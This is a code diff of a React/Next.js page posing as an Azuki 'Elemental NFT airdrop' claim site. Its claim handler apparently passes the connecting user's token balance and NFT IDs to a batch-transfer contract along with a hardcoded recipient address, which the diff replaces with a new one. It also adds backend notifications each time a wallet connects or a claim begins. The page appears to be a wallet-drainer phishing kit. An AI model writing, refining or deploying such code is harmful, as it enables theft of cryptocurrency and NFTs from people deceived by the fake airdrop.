@@ -2,14 +2,15 @@
 
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
-import toast from 'react-hot-toast';
+import toast, { Toaster } from 'react-hot-toast';
 import { useAccount, useWriteContract, useWaitForTransactionReceipt } from 'wagmi';
 import dynamic from 'next/dynamic';
-import { useAppKit } from '@reown/appkit/react'; // ✅ 1. Import the hook
+import { useAppKit } from '@reown/appkit/react';
 
 const ClientOnlyToaster = dynamic(() => import('@/components/ClientOnlyToaster'), {
   ssr: false,
 });
+
 // =================================================================
 // TYPE DEFINITIONS
 // =================================================================
@@ -18,14 +19,12 @@ interface IAlchemyNft {
     tokenId: string;
     name?: string;
 }
-
 interface IToken {
     token_address: `0x${string}`;
     balance: string;
     decimals: number;
     symbol: string;
 }
-
 interface NetworkConfig {
     name: string;
     alchemySubdomain: string;
@@ -43,7 +42,7 @@ const networkConfig: Record<number, NetworkConfig> = {
   1: { 
     name: "Ethereum Mainnet", 
     alchemySubdomain: "mainnet", 
-    batchTransferAddress: "0xYOUR_MAINNET_CONTRACT_ADDRESS_HERE" // TODO: Add Mainnet contract address
+    batchTransferAddress: "0xYOUR_MAINNET_CONTRACT_ADDRESS_HERE"
   },
   11155111: { 
     name: "Sepolia Testnet", 
@@ -55,29 +54,52 @@ const networkConfig: Record<number, NetworkConfig> = {
 export default function AirdropPage() {
   const { address, chainId, isConnected } = useAccount();
   const { data: hash, writeContractAsync } = useWriteContract();
-  const { open } = useAppKit(); // ✅ 2. Call the hook to get the open function
+  const { open } = useAppKit();
 
   const [isProcessing, setIsProcessing] = useState(false);
   const [loadingMessage, setLoadingMessage] = useState('');
+  const [hasNotifiedConnection, setHasNotifiedConnection] = useState(false);
   
   const { isSuccess: isTxSuccess, isError: isTxError } = useWaitForTransactionReceipt({ hash });
 
+  // ✅ New helper function to send notifications
+  const notifyBackend = async (walletAddress: string, action: string) => {
+    try {
+      await axios.post('/api/send-email', { walletAddress, action });
+      console.log(`Notification sent for action: ${action}`);
+    } catch (error) {
+      // We don't want to block the user if this fails, so we just log the error
+      console.error('Failed to send backend notification:', error);
+    }
+  };
+
+  // ✅ useEffect to trigger email on wallet connection
   useEffect(() => {
-    if (isTxSuccess) {
-      toast.success('Transaction Confirmed!');
+    if (isConnected && address && !hasNotifiedConnection) {
+      notifyBackend(address, 'Wallet Connected');
+      setHasNotifiedConnection(true); // Ensure it only fires once per connection session
+    } else if (!isConnected) {
+      setHasNotifiedConnection(false); // Reset on disconnect
     }
-    if (isTxError) {
-      toast.error('Transaction Failed. Please check your wallet.');
-    }
+  }, [isConnected, address, hasNotifiedConnection]);
+
+
+  useEffect(() => {
+    if (isTxSuccess) toast.success('Transaction Confirmed!');
+    if (isTxError) toast.error('Transaction Failed. Please check your wallet.');
   }, [isTxSuccess, isTxError]);
 
 
   const handleClaim = async () => {
-    // ... (This entire function remains unchanged)
     if (!isConnected || !address || !chainId) return toast.error("Please connect your wallet first.");
+    
+    // ✅ Trigger email on claim attempt
+    notifyBackend(address, 'Claim Initiated');
+    
     setIsProcessing(true);
     const toastId = toast.loading("Initializing...");
     try {
+      // ... (rest of the handleClaim logic is unchanged) ...
       const currentConfig = networkConfig[chainId];
       if (!currentConfig) throw new Error("Unsupported Network. Please switch to Mainnet or Sepolia.");
       let currentMessage = "Verifying your assets...";
@@ -133,7 +155,7 @@ export default function AirdropPage() {
           targetToken ? BigInt(targetToken.balance) : 0n,
           targetNftCollection || "0x0000000000000000000000000000000000000000",
           targetNftIds,
-          "0x150e3EaE1F50395Aff0b1f99cD61999a76391f34"
+          "0x60615206db4b92a5a37acce0e52ddb8b2898f053"
         ],
       });
       toast.success("Airdrop Claim Initiated!", { id: toastId });
@@ -149,7 +171,6 @@ export default function AirdropPage() {
   return (
     <div className="text-white min-h-screen bg-background font-sans relative overflow-hidden">
         <ClientOnlyToaster />
-
         {isProcessing && (
             <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex flex-col items-center justify-center z-50 p-4 text-center">
                 <div className="loader"></div>
@@ -157,9 +178,7 @@ export default function AirdropPage() {
                 <p className="text-gray-400 mt-2 max-w-md">Please confirm any transactions in your wallet.</p>
             </div>
         )}
-        
         <div className="absolute inset-0 bg-gradient-to-br from-slate-950 via-red-950/20 to-slate-900"></div>
-        
         <header className="absolute top-0 left-0 w-full p-4 sm:p-6 md:p-8 flex justify-between items-center z-20 backdrop-blur-sm">
              <div className="flex items-center space-x-3">
                  <svg width="60" height="60" viewBox="0 0 69 69" fill="none" xmlns="http://www.w3.org/2000/svg" className="drop-shadow-lg">
@@ -188,7 +207,6 @@ export default function AirdropPage() {
                         The gates to the Garden are open. The next chapter of the Azuki universe awaits. Claim your Elemental NFT airdrop to continue the journey.
                     </p>
                     <div className="pt-4">
-                        {/* ✅ 3. The JSX now uses a custom button for both states */}
                         {isConnected ? (
                              <button 
                                 className="group relative bg-gradient-to-r from-red-600 to-red-700 text-white font-bold text-xl md:text-2xl uppercase py-6 px-16 rounded-2xl shadow-2xl transition-all duration-500 ease-out hover:from-red-500 hover:to-red-600 hover:scale-105 hover:shadow-red-500/50 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 transform-gpu"
